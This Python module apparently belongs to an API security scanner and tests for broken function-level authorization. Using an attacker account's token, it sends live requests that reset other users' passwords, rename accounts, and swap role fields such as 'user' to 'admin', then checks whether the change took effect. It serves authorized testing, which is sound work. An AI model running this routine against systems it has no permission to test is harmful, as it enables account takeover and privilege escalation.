from pathlib import Path
from core.http_client import send_request
BFLA_WORDLIST = Path("wordlists") / "BFLA_endpoints"
import json
#from bola import retrieve_id
from core.models import Finding
from urllib.parse import urlparse 

METADATA_FACTOR = 0.4
METHOD_SCORES = {"DELETE": 8,"PUT": 6,"PATCH": 6,"POST": 5,"GET": 1,"HEAD": 0,"OPTIONS": 0,"TRACE": 0,}
White_list = {"login","signin","sign-in","authenticate","authentication","token","session","reset-password"}
STRONG_SEGMENTS = {"admin", "administrator", "internal", "management", "root", "superuser"}
ROLE_FIELDS = ("role","roles","user_role","is_admin","is_staff","is_superuser","permissions","scope","authorities","account_type","user_type","privilege","group")
role_escalations = {'customer': 'employee','user': 'admin','viewer': 'editor','editor': 'owner','guest': 'user','member': 'moderator','moderator': 'admin','subscriber': 'contributor','support': 'support_admin','analyst': 'admin','operator': 'admin','free': 'pro',}
HAR_B = Path("HarFiles") / "HarB.har"

def bfla(endpoints, accounts, url):
    bfla_candidates=[]
    accountA = accountB = accountAD = None
    
    for account in accounts:
        if account is None:
            continue
        if account.Label == 'A':
            accountA=account
        elif account.Label == 'B':
            accountB=account
        elif account.Label == 'AD':
            accountAD=account

    admin_provided = accountAD is not None
    if accountA is None:
        print("[!] BFLA requires account A (standard attacker account). Aborting.")
        return []

    wordlist = loadwordlist()

    for endpoint in endpoints:
        
        if is_self_service(endpoint.path):
            continue   
        score = (
            check_method(endpoint.method)
            + check_path(endpoint.path, wordlist)
            + check_metadata(endpoint, wordlist)
        )
        bfla_candidates.append((score,endpoint))
        
    bfla_candidates.sort(key=lambda item: item[0], reverse=True)
    
    print("[+] Order of potential BFLA endpoints:")
    for score,endpoint in bfla_candidates:
        print(f"\tSCORE={score} {endpoint.method} {endpoint.path}")
        
    findings=[]
    headers = {
        "Authorization": f"Bearer {accountA.token}",
        "Content-Type": "application/json",
    }
    # BFLA 
    for _,endpoint in bfla_candidates[:5]:
        
        method=endpoint.method 
        bfla_url=endpoint.path
        #print(f"[DEBUG]: {bfla_url }")
        
        body_is_required = getattr(endpoint.request_body, "required", False)
        object_is_required= endpoint.object_candidates
        #print(f"[DEBUG]: body_required: {body_is_required } object_required: {object_is_required}")
        found_values = {'request_body':{},'object_id':{}}

        get_url=None
        if body_is_required:
            print("-----------------------------------------------------")
            print(f"[DEBUG]: Entering body is required")
            PROPS = (endpoint.request_body and endpoint.request_body.properties) or {}  # {'username': {'type': 'string'}, 'role': {'type': 'string'}}
            # print(f"[DEBUG]: { PROPS}")
            ATTRIBUTE = [property for property in PROPS if property] # ['username','role']
            #print(f"[DEBUG]: {ATTRIBUTE }")
            valid_GET_endpoints = find_valid_GET_endpoints(ATTRIBUTE, endpoints) # /profile since it have those attributes 
            #print(f"[DEBUG]: {valid_GET_endpoints }") # BUG IDENTIFIED, FIXED
            if not valid_GET_endpoints:
                # pas de check endpoint : on ne peut pas confirmer, on passe (ou on tente sans confirmation)
                target = None
                
            else:
                target = valid_GET_endpoints[0] # fix the first one in case there were many
                
            if target:
                
                if not findobj(target): # check if there is no other object ID inside
                    get_url = url.rstrip('/') + '/' + target.path.lstrip('/')  
    
                else:
                    id=(retrieve_id(HAR_B,target.path) or "") # 102
                    index_bd,_=findobj(target)[0] # index= 3
                    seg_tar=target.path.strip('/').split('/') # ['users','identity','{videoID}'] 
                    seg_tar[index_bd]=str(id)  # ['users','identity','102'] 
                    target_url='/'.join(seg_tar) # users/identity/102
                    get_url=url.rstrip('/') + '/' + target_url.lstrip('/') # http://localhost/users/identity/102
                
                response_bd = send_request('GET', get_url, headers) 
                body=safe_json(response_bd)
                for a in ATTRIBUTE: 
                    print(f"[DEBUG]: a: {a}")
                    print(f"[DEBUG]: body: {body }")
                    found_values['request_body'][a]=extract_field(body, [a],exclude=getattr(accountA, a, None)) if (body is not None and response_bd.status_code == 200) else None # BUG check if the attribute isn't yours / {'video_name':'abc.mp4"} or {'role':'Customer','username':'Alice'}

        if object_is_required:
            print("-------------------------------------------------------------------------------------")
            print(f"[DEBUG]: entering object_is_required")
            objs = findobj(endpoint) # itemID, username, video_id
            if not objs:
                continue
            _, obj=objs[0]
            ATTRIBUTE = [obj]         # ['itemID'] or ['username'] or ['video_id']
            if obj.endswith('id'):
                ATTRIBUTE.append("id")
            valid_GET_endpoints = find_valid_GET_endpoints(ATTRIBUTE, endpoints) # GET /menu or GET /users or GET /identity/api/v2/users/videos/{video_id}
            if not valid_GET_endpoints:
                # pas de check endpoint : on ne peut pas confirmer, on passe (ou on tente sans confirmation)
                target = None
            else:
                target = valid_GET_endpoints[0]  
            if target:  
                if target and not  findobj(target):       
                    get_url = url.rstrip('/') + '/' + target.path.lstrip('/')   # http://localhost/menu or http://localhost/users
                    response_obj = send_request('GET', get_url, headers)
                    body=safe_json(response_obj)
                    for a in ATTRIBUTE:              # a = 'username', puis 'role'  
                        found_values['object_id'][a]=extract_field(body, [a],exclude=getattr(accountA, a, None)) if (body is not None and response_obj.status_code == 200) else None # BUG check if the attribute isn't yours 
                else:
                    id=(retrieve_id(HAR_B,bfla_url) or "") # 102  
                    for a in ATTRIBUTE:       
                        print(f"[DEBUG]: a: {a}")
                        print(f"[DEBUG]: body: {body }") 
                        found_values['object_id'][a] = id  # {'video_id':102}
        print(f"GET_URL: {get_url}")
        resource_is_affected=False
        if found_values["object_id"]:
            objs_bfla=findobj(bfla_url)
            if objs_bfla:
                i,o=objs_bfla[0]
                value_id=found_values['object_id'].get(o)
                if value_id is not None:    
                    seg_bfla=bfla_url.strip('/').split('/')
                    seg_bfla[i]=str(value_id)
                    bfla_url='/'.join(seg_bfla)
                    
        request_url= url.rstrip('/') + '/' + bfla_url.lstrip('/')
        
        priv_esc= False
        for _, value in found_values.items():
            if 'password' in value:
                 priv_esc = True # since obviously modifying a password of ours is within our rights, then we should aim of another user's password 
        for _,value in found_values.items():
            for element in value:
                if element == 'password': 
                    value[element]='random_password'
                elif element in ROLE_FIELDS: 
                    
                    for role in role_escalations: # 
                        if role == value[element]:
                            value[element]=role_escalations[role].capitalize()
                elif element == 'username' and priv_esc == True:
                    value[element]='name3'  
        print("--------------------------------------------------------")
        print(f"[DEBUG]: {request_url }")       
        print(f"[DEBUG]: { found_values['request_body']}")  
            
        before=send_request('GET', get_url, headers) if get_url else None
        response=send_request(method,request_url,headers,json_body=found_values["request_body"])
        after=send_request('GET', get_url, headers) if get_url else None
        print(f"before: {before.text}")
        print(f"after: {after.text}")
        if before is not None and after is not None and before.text != after.text:
            resource_is_affected = True
        response_status=analyse_response(safe_json(response))
        confidence=evaluate_confidence(response_status,resource_is_affected)
        if confidence:
            finding= Finding(
                vulnerability='BFLA',
                endpoint=endpoint,
                confidence=confidence,
                evidence={'evidence':[
                            before.text if before is not None else None,
                            after.text if after is not None else None,
                            resource_is_affected,
                            safe_json(response),
                        ]}
                
            )
            print(f'finding: {finding}')
            findings.append(finding)
        break
    return findings

def find_valid_GET_endpoints(attributes,ALL_endpoints,check_path_with_obj=False):
    #print(f"[DEBUG]: we looking for:{attributes}")
    valid_GET_endpoints=[]
    

    for other_endpoint in ALL_endpoints:
        if other_endpoint.method != 'GET':
            continue
        if findobj(other_endpoint.path) and check_path_with_obj is False:
            
            continue
        #print(f"[DEBUG]: {other_endpoint.method} {other_endpoint.path }")
        check_properties=(other_endpoint.responses and other_endpoint.responses.properties) or {}
        #print(f"[DEBUG]: check_prop: {check_properties }")
        
        #check_properties=[response for response in check_properties if response]
        #print(f"[DEBUG]: if it is here : {check_properties}")
        found = all(check_properties_presence(check_properties, element) for element in attributes)

        if found: # this logic only checks superficial keys
            valid_GET_endpoints.append(other_endpoint)
    if not valid_GET_endpoints and check_path_with_obj is False:
        return find_valid_GET_endpoints(attributes,ALL_endpoints,check_path_with_obj=True)
    print(f"[DEBUG]: endpoints_found:   {[valid_GET_endpoint.path for valid_GET_endpoint in valid_GET_endpoints] }")
    return valid_GET_endpoints 

def check_properties_presence(properties, target):
    if not isinstance(properties, dict):
        return False

    for key, value in properties.items():

        if key == target:
            return True

        if isinstance(value, str):
            if value == target:
                return True

        elif isinstance(value, dict):
            if check_properties_presence(value, target):
                return True

    return False
	
# def find_valid_GET_endpoints(attributes,ALL_endpoints):
#     print(f"[DEBUG]: we looking for:{attributes}")
#     valid_GET_endpoints=[]
    

#     for other_endpoint in ALL_endpoints:
#         if other_endpoint.method != 'GET':
#             continue
#         print(f"[DEBUG]: {other_endpoint.method} {other_endpoint.path }")
#         check_properties=(other_endpoint.responses and other_endpoint.responses.properties) or {}
#         print(f"[DEBUG]: check_prop: {check_properties }")
#         check_properties=[response for response in check_properties if response]
#         print(f"[DEBUG]: if it is here : {check_properties}")
        
#         if attributes and all(p in check_properties for p in attributes): # this logic only checks superficial keys
            
#             valid_GET_endpoints.append(other_endpoint)
#     print(f"[DEBUG]: endpoint_found:   {valid_GET_endpoints }")
#     return valid_GET_endpoints 


def evaluate_confidence(message_status,resource_is_affected):
    confidence=None
    if message_status == 'success':
        confidence='HIGH'
    elif resource_is_affected:
        confidence='MEDIUM'
    
    return confidence
    
def analyse_response(body):
    SUCCESS_PATTERNS = ["success", "ok", "created", "updated", "retrieved"]
    FAILURE_PATTERNS = ["unauthorized", "forbidden", "denied", "not found", "invalid", "error", "access denied", "permission"]

    message = extract_field(body, ["message"])
    status = extract_field(body, ["status"])

    parts = [p.lower() for p in (message, status) if isinstance(p, str)]
    if not parts:
        return "ambiguous"
    text = " ".join(parts)

    if any(p in text for p in FAILURE_PATTERNS):
        return "failure"
    if any(p in text for p in SUCCESS_PATTERNS):
        return "success"
    return "ambiguous"




def find_identity_endpoints(endpoints):
    SELF_REFERENCING_KEYWORDS = ["me","profile","myprofile","self","whoami",
                                 "account","my-account","current-user","currentuser",
                                ]
    for endpoint in endpoints:
        path=endpoint.path
        segpath=path.strip('/').split('/')
        for srk in SELF_REFERENCING_KEYWORDS:
            if srk in segpath:                
                return endpoint
            
    return None


def findobj(endpoint):
    if isinstance(endpoint,str):
        bfla_url=endpoint
    else:
        bfla_url = endpoint.path
    segments=bfla_url.strip('/').split('/')
    objects=[]
    for i,seg in enumerate(segments):
        if seg.startswith('{') and seg.endswith('}'):
            objectid=seg.strip("{}")
            objects.append((i,objectid))

    return objects 

def check_method(method) -> int:
    return METHOD_SCORES.get(method.upper(), 0)

def check_path(path, wordlist) -> int:
    score = 0
    segments = path.strip("/").split("/")

    for segment in segments:
        weight = wordlist.get(segment.lower())
        if weight:
            score += weight

    return score


def check_metadata(endpoint, wordlist) -> int:
    score = 0
    operation_id = (endpoint.operation_id or "").lower()
    summary = (endpoint.summary or "").lower()
    description = (endpoint.description or "").lower()
    tags = endpoint.tags or []
    normalized_tags = " ".join(str(tag).lower() for tag in tags)
    searchable_text = " ".join(
        [
            operation_id,
            summary,
            description,
            normalized_tags,
        ]
    )
    for keyword, weight in wordlist.items():
        if keyword in searchable_text:
            score += weight * METADATA_FACTOR
    return int(score)

def is_self_service(path):
    segment_set = {s.lower() for s in path.strip("/").split("/")}
    return bool(segment_set & White_list) and not (segment_set & STRONG_SEGMENTS)

def loadwordlist():
    keywords = {}
    try:
        with BFLA_WORDLIST.open("r",encoding="utf-8",) as file:
            for line in file:
                line = line.strip().lower()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(",")
                keyword = parts[0].strip()
                if not keyword:
                    continue
                weight = 5
                if len(parts) > 1:
                    try:
                        weight = int(parts[1].strip())
                    except ValueError:
                        weight = 5
                keywords[keyword] = weight

    except OSError as exc:
        print(
            f"[!] Unable to read {BFLA_WORDLIST}: {exc}. "
            "Default BFLA keywords will be used."
        )

    return keywords


def extract_field(response_data, target_fields,exclude=None):
    print(f"\t[DEBUG]: RP: {response_data } TG:{target_fields}")
            
    if not isinstance(response_data, dict):
        return None
    
    for field in target_fields:
        if field not in response_data:
            continue
        
        value = response_data[field]
        if isinstance(value, str) and value.strip():
            if exclude is not None and value == exclude:
                continue
            return value
        if isinstance(value, bool):
            return {
                "field": field,
                "value": value,
            }
        if isinstance(value, list) and value:
            return value
    for value in response_data.values():
        if isinstance(value, dict):
            result = extract_field(value, target_fields,exclude)
            if result is not None:
                return result
        elif isinstance(value, list):
            for item in value:
                if isinstance(item, dict):
                    result = extract_field(item, target_fields,exclude)
                    if result is not None:
                        return result
    return None

def safe_json(response):
    if response is None:
        return {}
    try:
        return response.json()
    except ValueError:
        return {}
    



NON_ID_SEGMENTS = {"all", "recent", "me", "search", "list", "count",
                   "new", "latest", "top", "mine", "current"}

def retrieve_id(Har_file, bfla_path):
    objs = findobj(bfla_path)
    if not objs:
        return None
    index, _ = objs[0]
    segments = bfla_path.strip('/').split('/')

    with open(Har_file, encoding="utf-8") as f:
        har = json.load(f)

    for entry in har["log"]["entries"]:
        har_url = entry["request"]["url"]
        har_path = urlparse(har_url).path          
        seg_har_url = har_path.strip('/').split('/')
        if len(seg_har_url) != len(segments):
            continue
        if all(b == h for i, (b, h) in enumerate(zip(segments, seg_har_url)) if i != index):
            found = seg_har_url[index]
            if found.lower() in NON_ID_SEGMENTS:   
                continue
            print(f"\t[!] Id possibly found in {har_url}")
            print(f"\t[?] Id: {found}")
            return found

    return None